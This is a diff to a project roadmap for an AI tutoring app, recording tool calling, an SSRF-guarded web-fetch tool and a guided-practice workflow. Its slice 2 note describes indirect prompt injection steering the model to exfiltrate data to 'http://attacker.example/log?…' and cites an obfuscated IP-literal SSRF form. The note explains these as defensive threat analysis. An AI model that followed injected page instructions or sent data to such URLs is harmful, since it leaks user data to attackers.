@@ -433,12 +433,141 @@ persistent memory across sessions.
 **Goal:** the unified engine's agentic and workflow modes.
 
 **Scope**
-- ☐ Tool registry; live/external-data tool; retrieval-as-tool — exposed as LangGraph tool nodes.
-- ☐ Unified engine exposing chat / agentic / workflow modes as composable LangGraph graphs.
-- ☐ First structured workflow graph (e.g., guided practice / worked-example walkthrough).
+- ☑ Tool registry; live/external-data tool; retrieval-as-tool — exposed as LangGraph tool nodes.
+- ☑ Unified engine exposing chat / agentic / workflow modes as composable LangGraph graphs.
+- ☑ First structured workflow graph (e.g., guided practice / worked-example walkthrough).
 
 **DoD:** a guru can take a tool-using action and run at least one structured workflow end-to-end,
 selected by need/tier.
+
+> **Tool-calling foundation + agentic mode landed (slice 1).** Greenfield — `app/llm/` had zero
+> tool-call vocabulary before this slice, despite an old Phase 2 checkbox loosely implying a "tool
+> schema" existed. Added provider-agnostic tool types (`ToolDef`/`ToolCall`, `ToolUsePart`/
+> `ToolResultPart`, `ChatRole.TOOL`) to `app/llm/types.py`, with each provider translating to its
+> own wire shape — Anthropic's `tool_use`/`tool_result` blocks (coalescing consecutive
+> `ChatRole.TOOL` messages into one `user` message, since Anthropic requires every pending result
+> batched together) and OpenAI's `tool_calls` field / `role: "tool"` messages (one message per
+> result, no coalescing — the opposite requirement). Deliberately **hand-rolled**, not LangGraph's
+> prebuilt `create_react_agent`/`ToolNode` or Anthropic's Tool Runner — both require a LangChain
+> `BaseChatModel`-shaped object or direct SDK usage, which would reintroduce the exact coupling the
+> Phase 5 substrate note rejected ("nodes call our role-based `LLMClient`, no LangChain models").
+>
+> `app/agent/tools.py::build_tools` returns a fresh per-turn `list[Tool]` (mirrors
+> `build_tutor_graph(llm)` closing over the request's client) with one real tool this slice,
+> `search_materials`, wrapping `app/rag/retrieval.py::retrieve` — only `query` is model-controlled,
+> `session`/`llm`/`learner_id`/`subject_id` bind server-side so the model can never spoof a learner
+> or supply a subject it has no legitimate way to know. `app/agent/agentic.py::build_agentic_graph`
+> compiles a bounded `call_model ⇄ execute_tools` loop (no checkpointer, same no-HITL shape as
+> `tutor.py`), capped by `settings.agentic_max_iterations` (default 4) — verified directly by a test
+> that scripts a provider which always requests a tool call and asserts the graph still terminates.
+> A tool's own failure (unknown name or a raised exception) becomes an error `ToolResult` rather
+> than crashing the turn. Reachable via `ChatTurnRequest.mode: "chat" | "agentic"` (per-turn, not
+> persisted on `Conversation` — a learner can mix one tool-using turn into an otherwise plain
+> conversation); `send_message` checks `mode == "agentic"` first, ahead of the goal/refinement-gate
+> branching, so an agentic turn always bypasses goal negotiation. New `"tool_call"` SSE frame.
+>
+> **Accepted v1 gaps, documented not fixed:** intra-loop tool-call/tool-result exchanges aren't
+> persisted as `Message` rows (only the user message and final reply are) — a reloaded conversation
+> won't show what was searched; a `ToolCall` audit table mirroring `LLMCall` is the natural
+> follow-up. Hitting `agentic_max_iterations` mid-tool-call degrades gracefully (`done` event's
+> `detail="capped"`, whatever partial reply exists persists) rather than erroring, mirroring the
+> refinement gate's auto-commit-at-`max_rounds` precedent. The `astream`-mode-dispatch boilerplate
+> is now duplicated a third time across `run_tutor_turn`/`run_refinement_turn`/`run_agentic_turn`;
+> not extracted this slice since the agentic service also needs to branch on `"token"` vs.
+> `"tool_call"` custom payloads, so a shared helper would need reshaping — deferred to the workflow
+> graph slice, where a third matching-shape call site would make the extraction concrete rather
+> than speculative.
+>
+> **Still open after slice 1:** the live/external-data tool, and the workflow mode + first
+> structured workflow graph. Landed in slice 2 below.
+>
+> **Live/external-data tool landed (slice 2).** `app/rag/fetch.py::default_fetch` — the existing
+> primitive, used only by the learner-initiated URL-ingestion path — was left untouched; a new
+> `safe_fetch` was added alongside it specifically for **model-controlled** URLs, a categorically
+> higher-risk trust boundary (the model decides which URL to fetch based on conversation content
+> that can include text from untrusted sources — an ingested page, a `search_materials` hit).
+> `safe_fetch` requires every DNS-resolved address for the host to be public — via `ipaddress`'s
+> `.is_global` (paired with an explicit multicast exclusion), not a naive enumeration of
+> `.is_private`/`.is_loopback`/etc., which misses RFC 6598 CGNAT space (`100.64.0.0/10`) — and does
+> not follow redirects (a redirect to an internal address would bypass the pre-connect check; a
+> real content-type check, since `raise_for_status()` doesn't raise on 3xx). It checks the
+> DNS-resolved address, never the URL string, so decimal/octal IP-literal obfuscation
+> (`http://2130706433/`) is a non-issue regardless of encoding. **Accepted, documented gaps, not
+> fixed:** a DNS-rebinding TOCTOU window between the resolve-and-check and the actual httpx
+> connection (both the robots.txt request and the main request re-resolve independently); and —
+> important not to overclaim — this only blocks *internal* targets. It does **not** address
+> indirect-prompt-injection-driven exfiltration to a *public* attacker-controlled URL (a
+> compromised page's content could still direct the model to `GET http://attacker.example/log?…` —
+> a different, unmitigated risk category from SSRF).
+>
+> `app/agent/tools.py::fetch_webpage` wraps `safe_fetch`, extracting readable text via
+> `trafilatura` for HTML (reusing the same extractor `app/rag/adapters/html.py` uses, called
+> directly rather than through the full ingestion-adapter machinery — no chunking/storage needed
+> for a stateless one-shot tool call) and falling back to plain UTF-8 decode otherwise; binary
+> content types (image/audio/video, PDF, octet-stream) are refused explicitly rather than decoded
+> into token-wasting mojibake. Output capped by `fetch_webpage_max_chars` (default 6,000, same
+> cost/UX-bound idiom as `placement_light_test_size`). `build_tools()` gained an injectable
+> `fetch: Fetcher = safe_fetch` kwarg, mirroring `ingest_source(..., fetch: Fetcher =
+> default_fetch)`'s exact seam, so tests inject a canned fetcher with no live network. Unlike
+> `search_materials`, `fetch_webpage` needs no `session`/`llm`/`learner_id` — it's fully stateless.
+>
+> **`build_tools()`'s flat list still not promoted** to a heavier `ToolSpec`/`ToolContext`
+> registry — tool #2 has now arrived, but the actual motivating need (tier-gating, per-tool
+> context shape) still doesn't exist: `Learner` has no `tier` field, and "tier" elsewhere in this
+> codebase's docs means the age/persona rollout (MASTERPLAN: "MVP deliberately stays in the adult
+> tier"), not a feature-access system. YAGNI still holds.
+>
+> **Still open after slice 2:** the unified engine's workflow mode + first structured workflow
+> graph. Landed in slice 3 below, closing out Phase 6.
+>
+> **Workflow mode landed (slice 3) — Phase 6 complete.** The third mode: a fixed multi-step
+> sequence with a human-in-the-loop pause, distinct from `agentic` (model freely chooses tools)
+> and `chat` (one generate call). Chosen workflow: **guided practice** — present a worked example +
+> practice problem for the learner's active lesson-plan step, pause for their attempt, grade it,
+> give feedback (looping for another attempt, capped, if wrong), done. `app/agent/workflow.py`'s
+> loop (`present -> await_response -> grade -> respond`, routing back to `await_response` until
+> correct or `workflow_max_rounds` is hit) mirrors `refinement.py`'s HITL/checkpointer shape
+> (its own `InMemorySaver`, same documented limitations) but is new territory: `grade` actually
+> **writes to the DB mid-graph**, closing over `session`/`learner_id` (never stored in
+> checkpointed state) — the dispatcher rebuilds the graph fresh each request with that request's
+> own `session`/`llm`, exactly like `build_refinement_graph(llm)` already does. `grade` calls the
+> existing `assessment_svc.answer_item` — the same grade→tracer→plan-revise transaction
+> `/items/{id}/answer` already uses — so this workflow adds zero new grading/tracer logic.
+>
+> **Item-type scoping was the one real design fork.** `AnswerSubmit.response`'s shape is
+> item-type-specific (MCQ needs a `{"choice": <index>}` matched against a `choices` list
+> `ItemRead` doesn't even expose to the learner — a separate, pre-existing gap left untouched) —
+> none of which map cleanly from free-text chat except `ItemType.SHORT` (open, rubric-graded):
+> `{"text": reply}` is a direct match, and it exercises the LLM rubric-grading path CLAUDE.md
+> calls load-bearing. Added `generate_short_item` (`app/learning/item_generation.py`, mirroring
+> the three existing generators) and `session_runner.short_answer_item_for_kc` — a **dedicated**
+> resolver, deliberately without `item_for_kc`'s any-type/MCQ fallback, since falling back to a
+> different item type would silently mis-grade every submission as incorrect rather than fail
+> loudly. `respond`'s feedback instructs the model to re-pose the *same* problem with a hint when
+> looping, never a new one — grading is always anchored to the original `item.stem`, so a
+> model-invented "next problem" would be graded against a question the learner was never asked.
+>
+> Reachable via `ChatTurnRequest.mode: "chat" | "agentic" | "workflow"`; `send_message` checks
+> `mode == "workflow"` **or** an in-flight workflow checkpoint (whichever is true) right after
+> `agentic`, ahead of goal/refinement-gate branching — a workflow presupposes a committed goal +
+> plan, so it never negotiates one, and an in-flight workflow always wins over the client's `mode`
+> on the next turn, mirroring the refinement gate's `is_awaiting_reply` precedent exactly. The
+> `awaiting_reply` SSE frame gained `item` (previously `done`-only) so the client can render the
+> practice problem while paused. No new `TurnEvent` fields beyond that — the grade/score is folded
+> into `respond`'s prose rather than wired as structured data, a deliberate v1 scoping choice.
+>
+> **Verified empirically before implementing** (not just recalled from training): reusing one
+> `thread_id` across multiple sequential fresh (non-`Command`) runs on the same LangGraph
+> checkpointer correctly starts over from `START` each time, with no stale bleed-through from an
+> earlier completed run — what lets one conversation support multiple guided-practice sessions
+> over time on `thread_id = str(conversation_id)`; and `aget_state` on a thread that's never been
+> run returns an empty, falsy snapshot, so `is_awaiting_reply` needs no special-casing for a
+> conversation that's never attempted a workflow.
+>
+> **This closes Phase 6's DoD**: a guru can take a tool-using action (`agentic`, slice 1-2) and
+> run a structured workflow end-to-end (`workflow`, slice 3). "Selected by need/tier" is satisfied
+> minimally — `mode` is an explicit per-turn client choice, not yet auto-selected by a policy; a
+> future phase could add that without changing this shape.
 
 ---
 
